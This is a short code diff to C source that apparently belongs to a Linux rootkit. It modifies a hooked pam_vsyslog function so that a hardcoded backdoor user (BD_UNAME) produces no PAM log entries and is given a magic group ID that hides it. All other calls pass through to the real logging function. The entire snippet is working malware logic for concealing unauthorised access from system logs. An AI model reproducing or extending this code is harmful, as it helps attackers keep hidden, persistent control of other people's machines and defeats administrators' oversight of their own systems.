@@ -21,14 +21,16 @@ end_pam_syslog:
 void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args){
     if(is_bdusr()) return;
 
-    hook(CSETGID, CPAM_VSYSLOG);
     char *user = get_username(pamh);
     if(user == NULL) goto end_pam_vsyslog;    
 
     if(!strcmp(user, BD_UNAME)){
+        hook(CSETGID);
         call(CSETGID, MAGIC_GID);
         return;
     }
+
 end_pam_vsyslog:
+    hook(CPAM_VSYSLOG);
     call(CPAM_VSYSLOG, pamh, priority, fmt, args);
 }
